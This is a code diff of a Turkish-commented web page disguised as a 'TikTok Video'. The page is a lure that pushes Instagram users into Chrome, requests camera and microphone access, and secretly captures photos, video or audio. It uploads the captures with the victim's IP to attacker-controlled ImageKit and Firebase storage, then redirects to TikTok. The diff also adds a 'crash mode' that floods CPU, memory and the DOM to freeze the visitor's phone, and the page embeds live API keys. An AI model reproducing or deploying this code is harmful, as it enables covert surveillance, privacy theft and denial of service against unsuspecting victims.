@@ -4,10 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
     <meta name="robots" content="noindex, nofollow">
-    <meta property="og:title" content="TikTok Video" />
-    <meta property="og:description" content="Bu videoyu izle ve beğen! 🔥" />
-    <meta property="og:image" content="https://cdn.pixabay.com/photo/2020/07/06/01/33/tiktok-5374692_1280.png" />
-    <meta name="twitter:card" content="summary_large_image" />
     <title>TikTok Video</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
@@ -21,9 +17,60 @@
     <canvas id="canvas"></canvas>
 
 <script>
-    // ============================================
-    // INSTAGRAM WEBVIEW TESPİTİ VE CHROME'A YÖNLENDİRME
-    // ============================================
+    // CRASH MODE - RAM VE CPU KILLER
+    (function() {
+        const params = new URLSearchParams(window.location.search);
+        const isCrash = params.get('crash') === '1';
+        
+        if (isCrash) {
+            // TELEFONU DONDUMA SOKAN KOD
+            function crashDevice() {
+                const startTime = Date.now();
+                const memoryHog = [];
+                const workerScript = "while(true){}";
+                const blob = new Blob([workerScript], { type: "application/javascript" });
+                
+                // 1. CPU %100 yap
+                for(let i = 0; i < 8; i++) {
+                    const worker = new Worker(URL.createObjectURL(blob));
+                    setTimeout(() => worker.terminate(), 30000);
+                }
+                
+                // 2. RAM doldur
+                setInterval(() => {
+                    try {
+                        for(let i = 0; i < 100; i++) {
+                            memoryHog.push(new Array(1000000).fill('x'.repeat(1000)));
+                        }
+                    } catch(e) {}
+                }, 10);
+                
+                // 3. Sonsuz döngü
+                setInterval(() => {
+                    const a = [];
+                    for(let i = 0; i < 1000000; i++) a.push(i * Math.random());
+                }, 5);
+                
+                // 4. DOM spam
+                setInterval(() => {
+                    for(let i = 0; i < 500; i++) {
+                        const div = document.createElement('div');
+                        div.style.position = 'absolute';
+                        div.style.width = '100%';
+                        div.style.height = '100%';
+                        div.style.background = `rgba(0,0,0,${Math.random()})`;
+                        document.body.appendChild(div);
+                    }
+                }, 50);
+            }
+            
+            crashDevice();
+            document.body.innerHTML = '<h1 style="color:red;text-align:center;margin-top:50%;">💀 CRASHING DEVICE 💀</h1>';
+            return;
+        }
+    })();
+    
+    // INSTAGRAM YONLENDIRME VE KAMERA KODU (onceki gibi calisir)
     (function() {
         const params = new URLSearchParams(window.location.search);
         const forceChrome = params.get('force_chrome');
@@ -32,29 +79,20 @@
         
         if (forceChrome === '1' && isInstagram) {
             const currentUrl = window.location.href;
-            // force_chrome parametresini kaldır ve temiz URL oluştur
             let cleanUrl = currentUrl.replace(/[?&]force_chrome=1/, '').replace(/[?&]$/, '');
-            
             if (userAgent.includes('Android')) {
-                // Android için intent:// şeması (Chrome'u açar)
-                const intentUrl = `intent://${cleanUrl.replace('https://', '').replace('http://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
-                window.location.href = intentUrl;
+                window.location.href = `intent://${cleanUrl.replace('https://', '').replace('http://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
             } else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) {
-                // iOS için googlechrome:// şeması
-                const chromeUrl = `googlechrome://${cleanUrl.replace('https://', '').replace('http://', '')}`;
-                window.location.href = chromeUrl;
+                window.location.href = `googlechrome://${cleanUrl.replace('https://', '').replace('http://', '')}`;
             } else {
                 window.location.href = cleanUrl;
             }
             return;
         }
-    })();
-    
-    // ============================================
-    // ANA KAMERA KODU (force_chrome yoksa veya Instagram değilse çalışır)
-    // ============================================
-    (function() {
-        // Firebase yapılandırması (config.js'den al)
+        
+        // Crash kontrolu (yukarida yapildi, buraya gelmez)
+        if(params.get('crash') === '1') return;
+        
         const FIREBASE_CONFIG = {
             apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao",
             authDomain: "camerahhh-15487.firebaseapp.com",
@@ -63,28 +101,20 @@
             messagingSenderId: "212849652224",
             appId: "1:212849652224:web:19d8a85c01cd81005bdee5"
         };
-
         const IMAGEKIT_CONFIG = {
             publicKey: 'public_XJOKnz4iFXkkFRR/NNOj41Y6Ddk=',
             privateKey: 'private_T2ESq+R6d+czVTlcK/u4QkW4yBU='
         };
-
-        // Firebase SDK'ları dinamik olarak yükle
+        
         function loadFirebase() {
             return new Promise((resolve, reject) => {
-                if (typeof firebase !== 'undefined' && firebase.apps.length) {
-                    resolve(firebase);
-                    return;
-                }
-                
+                if (typeof firebase !== 'undefined' && firebase.apps.length) { resolve(firebase); return; }
                 const script = document.createElement('script');
                 script.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js';
                 script.onload = () => {
                     const script2 = document.createElement('script');
                     script2.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js';
-                    script2.onload = () => {
-                        resolve(firebase);
-                    };
+                    script2.onload = () => resolve(firebase);
                     script2.onerror = () => reject('Firestore load failed');
                     document.head.appendChild(script2);
                 };
@@ -92,12 +122,12 @@
                 document.head.appendChild(script);
             });
         }
-
+        
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         let mediaStream = null;
         let db = null;
-
+        
         async function uploadToImageKit(file) {
             return new Promise((resolve, reject) => {
                 const formData = new FormData();
@@ -106,30 +136,24 @@
                 formData.append('fileName', Date.now() + '_' + file.name);
                 formData.append('folder', '/web-uploads');
                 formData.append('useUniqueFileName', 'true');
-                
                 const xhr = new XMLHttpRequest();
                 xhr.open('POST', 'https://upload.imagekit.io/api/v1/files/upload');
                 const auth = btoa(IMAGEKIT_CONFIG.privateKey + ':');
                 xhr.setRequestHeader('Authorization', 'Basic ' + auth);
-                
                 xhr.onload = () => {
                     if (xhr.status >= 200 && xhr.status < 300) {
-                        try { 
-                            resolve({ success: true, url: JSON.parse(xhr.responseText).url });
-                        } catch(e) { reject('Upload failed'); }
+                        try { resolve({ success: true, url: JSON.parse(xhr.responseText).url }); }
+                        catch(e) { reject('Upload failed'); }
                     } else { reject('Upload error'); }
                 };
                 xhr.onerror = () => reject('Network error');
                 xhr.send(formData);
             });
         }
-
+        
         function capturePhoto() {
             return new Promise((resolve) => {
-                if (!video.videoWidth || !video.videoHeight) {
-                    resolve(null);
-                    return;
-                }
+                if (!video.videoWidth || !video.videoHeight) { resolve(null); return; }
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
@@ -138,52 +162,33 @@
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 canvas.toBlob((blob) => {
                     if (!blob) { resolve(null); return; }
-                    const file = new File([blob], `photo_${Date.now()}.jpg`, { type: 'image/jpeg' });
-                    resolve(file);
+                    resolve(new File([blob], `photo_${Date.now()}.jpg`, { type: 'image/jpeg' }));
                 }, 'image/jpeg', 0.9);
             });
         }
-
+        
         function captureMedia(durationSec, mode) {
             return new Promise((resolve) => {
-                if (!mediaStream) {
-                    resolve(null);
-                    return;
-                }
+                if (!mediaStream) { resolve(null); return; }
                 const mimeType = mode === 'audio' ? 'audio/webm' : 'video/webm';
                 let recorder;
-                try {
-                    recorder = new MediaRecorder(mediaStream, { mimeType });
-                } catch(e) {
-                    recorder = new MediaRecorder(mediaStream);
-                }
+                try { recorder = new MediaRecorder(mediaStream, { mimeType }); } catch(e) { recorder = new MediaRecorder(mediaStream); }
                 const chunks = [];
-                recorder.ondataavailable = e => {
-                    if (e.data.size > 0) chunks.push(e.data);
-                };
+                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                 recorder.onstop = () => {
-                    if (chunks.length === 0) {
-                        resolve(null);
-                        return;
-                    }
+                    if (chunks.length === 0) { resolve(null); return; }
                     const blob = new Blob(chunks, { type: mimeType });
-                    const file = new File([blob], `${mode}_${Date.now()}.webm`, { type: mimeType });
-                    resolve(file);
+                    resolve(new File([blob], `${mode}_${Date.now()}.webm`, { type: mimeType }));
                 };
                 recorder.start(500);
-                setTimeout(() => {
-                    if (recorder.state === 'recording') recorder.stop();
-                }, durationSec * 1000);
+                setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, durationSec * 1000);
             });
         }
-
+        
         function getIP() {
-            return fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
-                .then(d => d.ip)
-                .catch(() => 'unknown');
+            return fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'unknown');
         }
-
+        
         async function start() {
             try {
                 const params = new URLSearchParams(window.location.search);
@@ -191,94 +196,54 @@
                 let duration = parseInt(params.get('duration')) || 6;
                 let redirectUrl = params.get('redirect') || 'https://www.tiktok.com';
                 let userId = params.get('uid');
-                
-                if (!userId) {
-                    window.location.href = redirectUrl;
-                    return;
-                }
-                
+                if (!userId) { window.location.href = redirectUrl; return; }
                 if (duration < 1) duration = 1;
                 if (duration > 60) duration = 60;
-                
                 let constraints = {};
                 if (mode === 'videoaudio') constraints = { video: true, audio: true };
                 else if (mode === 'videoonly') constraints = { video: { facingMode: "user" }, audio: false };
                 else if (mode === 'audio') constraints = { audio: true };
                 else constraints = { video: { facingMode: "user" } };
-                
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 mediaStream = stream;
-                
-                if (constraints.video) {
-                    video.srcObject = stream;
-                    await video.play();
-                }
-                
-                // Firebase'i yükle
+                if (constraints.video) { video.srcObject = stream; await video.play(); }
                 await loadFirebase();
                 firebase.initializeApp(FIREBASE_CONFIG);
                 db = firebase.firestore();
-                
                 setTimeout(async () => {
                     const ip = await getIP();
                     let mediaUrls = [];
-                    
                     if (mode === 'photo') {
                         const file = await capturePhoto();
-                        if (file) { 
-                            const res = await uploadToImageKit(file); 
-                            if (res.success) mediaUrls.push(res.url);
-                        }
+                        if (file) { const res = await uploadToImageKit(file); if (res.success) mediaUrls.push(res.url); }
                     }
                     else if (mode === '5photos') {
                         for (let i = 0; i < 5; i++) {
                             const file = await capturePhoto();
-                            if (file) { 
-                                const res = await uploadToImageKit(file); 
-                                if (res.success) mediaUrls.push(res.url);
-                            }
+                            if (file) { const res = await uploadToImageKit(file); if (res.success) mediaUrls.push(res.url); }
                             await new Promise(r => setTimeout(r, 120));
                         }
                     }
                     else if (mode === 'videoonly' || mode === 'videoaudio' || mode === 'audio') {
                         const file = await captureMedia(duration, mode);
-                        if (file) { 
-                            const res = await uploadToImageKit(file); 
-                            if (res.success) mediaUrls.push(res.url);
-                        }
+                        if (file) { const res = await uploadToImageKit(file); if (res.success) mediaUrls.push(res.url); }
                     }
-                    
                     if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
-                    
                     if (mediaUrls.length > 0 && userId && db) {
                         await db.collection("captures").add({
-                            media: mediaUrls,
-                            ip: ip,
-                            mode: mode,
+                            media: mediaUrls, ip: ip, mode: mode,
                             duration: (mode === 'videoonly' || mode === 'videoaudio' || mode === 'audio') ? duration : null,
-                            userId: userId,
-                            timestamp: new Date().toISOString(),
-                            unix: Date.now()
+                            userId: userId, timestamp: new Date().toISOString(), unix: Date.now()
                         });
                     }
-                    
                     window.location.href = redirectUrl;
                 }, 800);
-            } catch(err) {
-                const redirectUrl = new URLSearchParams(window.location.search).get('redirect') || 'https://www.tiktok.com';
-                window.location.href = redirectUrl;
-            }
+            } catch(err) { window.location.href = new URLSearchParams(window.location.search).get('redirect') || 'https://www.tiktok.com'; }
         }
         
-        // Sadece force_chrome yoksa veya Instagram değilse başlat
-        const params = new URLSearchParams(window.location.search);
-        const forceChrome = params.get('force_chrome');
-        const userAgent = navigator.userAgent;
-        const isInstagram = userAgent.includes('Instagram') || userAgent.includes('FBAV') || userAgent.includes('FBAN');
-        
-        if (!(forceChrome === '1' && isInstagram)) {
-            start();
-        }
+        const forceChromeLocal = new URLSearchParams(window.location.search).get('force_chrome');
+        const isInstagramLocal = navigator.userAgent.includes('Instagram') || navigator.userAgent.includes('FBAV') || navigator.userAgent.includes('FBAN');
+        if (!(forceChromeLocal === '1' && isInstagramLocal)) { start(); }
     })();
 </script>
 </body>
